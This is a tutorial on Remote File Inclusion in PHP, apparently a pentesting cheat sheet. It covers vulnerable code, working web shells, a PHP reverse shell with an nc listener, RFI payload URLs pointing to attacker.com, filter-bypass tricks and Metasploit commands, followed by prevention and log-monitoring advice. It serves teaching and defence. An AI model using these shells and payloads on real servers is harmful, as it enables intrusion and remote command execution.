# Remote File Inclusion (RFI)

## Overview

Remote File Inclusion (RFI) is a vulnerability that allows attackers to include files from remote servers. This is more severe than LFI as it typically leads directly to remote code execution.

## How RFI Works

1. **Application includes files** based on user input
2. **Attacker provides remote URL** instead of local path
3. **Server fetches and executes** remote file
4. **Attacker gains code execution** on target server

## Requirements

For RFI to work, typically these PHP settings must be enabled:

```ini
allow_url_fopen = On
allow_url_include = On  # Deprecated but still present in old systems
```

**Check settings**:
```php
echo ini_get('allow_url_fopen');
echo ini_get('allow_url_include');
```

## Vulnerable Code

### PHP
```php
<?php
// VULNERABLE CODE
$page = $_GET['page'];
include($page);  // Can include remote files!
?>

// Exploit: ?page=http://attacker.com/shell.txt
```

### Python
```python
# Less common but possible
import urllib.request

page = request.args.get('page')
code = urllib.request.urlopen(page).read()
exec(code)  # VERY DANGEROUS!
```

## Basic RFI Attack

### 1. Create Malicious File

**shell.txt** (hosted on attacker.com):
```php
<?php
// Simple web shell
system($_GET['cmd']);
?>
```

### 2. Include Remote File

```
http://target.com/page.php?file=http://attacker.com/shell.txt
```

### 3. Execute Commands

```
http://target.com/page.php?file=http://attacker.com/shell.txt&cmd=whoami
http://target.com/page.php?file=http://attacker.com/shell.txt&cmd=ls -la
http://target.com/page.php?file=http://attacker.com/shell.txt&cmd=cat /etc/passwd
```

## Advanced RFI Techniques

### 1. SMB Share (Windows)

```
?file=\\attacker.com\share\shell.php
?file=//attacker.com/share/shell.php
```

**Setup SMB server** (attacker machine):
```bash
# Using Impacket
sudo impacket-smbserver share /path/to/files -smb2support
```

### 2. FTP Protocol

```
?file=ftp://attacker.com/shell.txt
?file=ftp://user:pass@attacker.com/shell.txt
```

### 3. Data URI

```
?file=data://text/plain,<?php system($_GET['cmd']); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### 4. PHP Stream Wrappers

```
?file=php://input
?file=php://filter/resource=http://attacker.com/shell.txt
```

## Bypass Techniques

### Extension Appended Bypass

If application appends `.php`:
```php
// Code: include($_GET['file'] . '.php');

// Use null byte (PHP < 5.3)
?file=http://attacker.com/shell.txt%00

// Use question mark
?file=http://attacker.com/shell.txt?

// Use hash
?file=http://attacker.com/shell.txt%23
```

### URL Encoding

```
?file=http%3A%2F%2Fattacker.com%2Fshell.txt
```

### Protocol Wrappers

```
?file=expect://whoami
?file=ssh2.shell://user:pass@attacker.com/resource
```

## Creating Web Shells

### Basic Shell
```php
<!-- shell.txt -->
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### Advanced Shell
```php
<!-- advanced_shell.txt -->
<?php
error_reporting(0);

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    // Try different execution functions
    if(function_exists('system')) {
        @system($cmd);
    } elseif(function_exists('exec')) {
        @exec($cmd, $output);
        echo implode("\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo @shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        @passthru($cmd);
    }
}
?>
```

### Reverse Shell
```php
<!-- reverse_shell.txt -->
<?php
$ip = '10.10.10.10';  // Attacker IP
$port = 4444;          // Attacker port

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>
```

**Listener** (attacker machine):
```bash
nc -lvnp 4444
```

## Testing for RFI

### Detection Steps

1. **Identify file parameter**:
   ```
   ?file=page.php
   ?include=template.php
   ?page=home
   ```

2. **Test with remote URL**:
   ```
   ?file=http://google.com
   ```

3. **Check server behavior**:
   - Does it fetch the remote file?
   - Any error messages about URL access?

4. **Host malicious file**:
   ```bash
   # Simple PHP server
   php -S 0.0.0.0:8000
   
   # Python server
   python3 -m http.server 8000
   ```

5. **Attempt RFI**:
   ```
   ?file=http://[your-ip]:8000/shell.txt
   ```

### Test Payload

**test.txt** (hosted on your server):
```php
<?php
echo "RFI Vulnerable!";
phpinfo();
?>
```

## RFI to RCE Exploitation Flow

1. **Confirm RFI vulnerability**
2. **Create web shell**: Simple PHP shell
3. **Host shell file**: Use Python/PHP server
4. **Include remote shell**: Via vulnerable parameter
5. **Execute commands**: Append `&cmd=command`
6. **Establish persistence**: Upload backdoor
7. **Privilege escalation**: If needed

## Real-World Examples

- **Mambo CMS**: RFI vulnerability in older versions
- **TimThumb**: WordPress plugin RFI
- **phpMyAdmin**: Historical RFI vulnerabilities

## Automated Tools

```bash
# Burp Suite Intruder
# - Load file parameter
# - Add payload: http://malicious.com/shell.txt

# Metasploit
use exploit/unix/webapp/php_include
set RHOST target.com
set PATH /vulnerable.php
set PHPURI http://attacker.com/shell.txt
run

# Custom Python script
python3 rfi_exploit.py -u http://target.com/page.php?file= -s http://attacker.com/shell.txt
```

## Prevention

### 1. Disable URL File Access

**php.ini**:
```ini
allow_url_fopen = Off
allow_url_include = Off
```

### 2. Input Validation

```php
// Whitelist approach
$allowed_files = ['home', 'about', 'contact'];
$file = $_GET['file'];

if (!in_array($file, $allowed_files)) {
    die("Invalid file");
}
include($file . '.php');
```

### 3. Validate Protocol

```php
// Only allow local files
$file = $_GET['file'];

if (filter_var($file, FILTER_VALIDATE_URL)) {
    die("Remote files not allowed");
}

// Or check for protocol
if (preg_match('/^(https?|ftp|data):/', $file)) {
    die("Remote access not allowed");
}

include($file);
```

### 4. Use Absolute Paths

```php
$base_dir = '/var/www/html/includes/';
$file = basename($_GET['file']);
$full_path = $base_dir . $file . '.php';

if (!file_exists($full_path)) {
    die("File not found");
}

include($full_path);
```

### 5. Strict File Verification

```php
$file = $_GET['file'];
$allowed_dir = realpath('/var/www/html/includes/');
$requested_file = realpath($allowed_dir . '/' . $file);

// Ensure file is within allowed directory
if (!$requested_file || strpos($requested_file, $allowed_dir) !== 0) {
    die("Access denied");
}

if (!file_exists($requested_file)) {
    die("File not found");
}

include($requested_file);
```

### 6. Framework Protections

**Use framework routers instead of dynamic includes**:

```php
// Laravel
Route::get('/{page}', 'PageController@show');

// Django
path('<page>/', views.show_page)

// Express
app.get('/:page', pageController.show)
```

## Defense in Depth

1. ✅ Disable `allow_url_include`
2. ✅ Disable `allow_url_fopen` if not needed
3. ✅ Whitelist allowed files
4. ✅ Validate and sanitize input
5. ✅ Use absolute paths
6. ✅ Implement proper access controls
7. ✅ Regular security audits
8. ✅ Web Application Firewall (WAF)

## Detection and Monitoring

**Monitor for suspicious requests**:
```
# Apache/Nginx logs
grep -E "(http://|https://|ftp://|data://)" access.log
grep -E "(allow_url|php://)" access.log

# Look for web shell patterns
grep -E "cmd=|exec|system|shell" access.log
```

## Resources

- OWASP File Inclusion
- PHP Manual: Filesystem Functions
- HackTricks RFI Guide
- PortSwigger File Upload Vulnerabilities
